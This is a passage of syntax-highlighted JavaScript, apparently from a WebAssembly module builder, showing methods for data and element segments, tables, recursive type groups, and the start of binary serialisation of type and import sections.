            <span class="token literal-property property">is_global</span><span class="token operator">:</span> is_global<span class="token punctuation">,</span>
            <span class="token literal-property property">is_active</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token literal-property property">mem_index</span><span class="token operator">:</span> memory_index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">addPassiveDataSegment</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span> <span class="token literal-property property">is_active</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">exportMemoryAs</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> memory_index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>memory_index <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> num_memories <span class="token operator">=</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">+</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>num_memories <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
                <span class="token string">"Pass memory index to 'exportMemoryAs' if there is not exactly "</span> <span class="token operator">+</span>
                  <span class="token string">"one memory imported or declared."</span>
              <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            memory_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>
            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalMemory<span class="token punctuation">,</span>
            <span class="token literal-property property">index</span><span class="token operator">:</span> memory_index<span class="token punctuation">,</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// &#123;offset&#125; is a constant expression.</span>
        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>
        <span class="token comment">// they are constant expressions.</span>
        <span class="token function">addActiveElementSegment</span><span class="token punctuation">(</span><span class="token parameter">table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">checkExpr</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>
            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>
        <span class="token comment">// they are constant expressions.</span>
        <span class="token function">addPassiveElementSegment</span><span class="token punctuation">(</span><span class="token parameter">elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>
            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// If &#123;type&#125; is undefined, then &#123;elements&#125; are function indices. Otherwise,</span>
        <span class="token comment">// they are constant expressions.</span>
        <span class="token function">addDeclarativeElementSegment</span><span class="token punctuation">(</span><span class="token parameter">elements<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> elements<span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>
            <span class="token keyword">new</span> <span class="token class-name">WasmElemSegment</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> elements<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">appendToTable</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> n <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> n <span class="token operator">!=</span> <span class="token string">"number"</span><span class="token punctuation">)</span>
              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
                <span class="token string">"invalid table (entries have to be numbers): "</span> <span class="token operator">+</span> array
              <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addTable</span><span class="token punctuation">(</span>kWasmAnyFunc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Adjust the table to the correct size.</span>
          <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">const</span> base <span class="token operator">=</span> table<span class="token punctuation">.</span>initial_size<span class="token punctuation">;</span>
          <span class="token keyword">const</span> table_size <span class="token operator">=</span> base <span class="token operator">+</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          table<span class="token punctuation">.</span>initial_size <span class="token operator">=</span> table_size<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max <span class="token operator">&amp;&amp;</span> table_size <span class="token operator">></span> table<span class="token punctuation">.</span>max_size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            table<span class="token punctuation">.</span>max_size <span class="token operator">=</span> table_size<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addActiveElementSegment</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">,</span> array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">setTableBounds</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token keyword">undefined</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"The table bounds of table '0' have already been set."</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addTable</span><span class="token punctuation">(</span>kWasmAnyFunc<span class="token punctuation">,</span> min<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token literal-property property">size</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Did not start a recursive group before ending one"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">let</span> last_element <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>last_element<span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
              <span class="token string">"Did not start a recursive group before ending one"</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          last_element<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> last_element<span class="token punctuation">.</span>start<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">setName</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token parameter">debug <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> typeToBuffer <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> binary <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> wasm <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
          <span class="token comment">// Add header.</span>
          binary<span class="token punctuation">.</span><span class="token function">emit_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">const</span> headerLen <span class="token operator">=</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token comment">// Add type section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting types @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTypeSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">let</span> length_with_groups <span class="token operator">=</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> group <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                length_with_groups <span class="token operator">-=</span> group<span class="token punctuation">.</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>length_with_groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">let</span> rec_group_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>
                  rec_group_index <span class="token operator">&lt;</span> wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span>
                  wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span>rec_group_index<span class="token punctuation">]</span><span class="token punctuation">.</span>start <span class="token operator">==</span> i
                <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmRecursiveTypeGroupForm<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>rec_groups<span class="token punctuation">[</span>rec_group_index<span class="token punctuation">]</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  rec_group_index<span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">let</span> type <span class="token operator">=</span> wasm<span class="token punctuation">.</span>types<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span>supertype <span class="token operator">!=</span> kNoSuperType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>
                    type<span class="token punctuation">.</span>is_final <span class="token operator">?</span> kWasmSubtypeFinalForm <span class="token operator">:</span> kWasmSubtypeForm
                  <span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// supertype count</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>supertype<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span>is_final<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmSubtypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// no supertypes</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">WasmStruct</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmStructTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>fields<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> field <span class="token keyword">of</span> type<span class="token punctuation">.</span>fields<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>mutability <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token keyword">instanceof</span> <span class="token class-name">WasmArray</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmArrayTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>mutability <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kWasmFunctionTypeForm<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> param <span class="token keyword">of</span> type<span class="token punctuation">.</span>params<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>results<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> result <span class="token keyword">of</span> type<span class="token punctuation">.</span>results<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>typeToBuffer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>headerLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">return</span> binary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>headerLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add imports section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>imports<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting imports @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kImportSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>imports<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> imp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>imports<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>name <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalFunction<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalGlobal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>mutable<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">const</span> has_max <span class="token operator">=</span> imp<span class="token punctuation">.</span>maximum <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
                  <span class="token keyword">const</span> is_shared <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>imp<span class="token punctuation">.</span>shared<span class="token punctuation">;</span>
                  <span class="token keyword">const</span> is_memory64 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>imp<span class="token punctuation">.</span>is_memory64<span class="token punctuation">;</span>
                  <span class="token keyword">let</span> limits_byte <span class="token operator">=</span>
                    <span class="token punctuation">(</span>is_memory64 <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>
                    <span class="token punctuation">(</span>is_shared <span class="token operator">?</span> <span class="token number">2</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>
                    <span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>limits_byte<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">let</span> <span class="token function-variable function">emit</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token operator">=></span>
                    is_memory64
                      <span class="token operator">?</span> section<span class="token punctuation">.</span><span class="token function">emit_u64v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
                      <span class="token operator">:</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
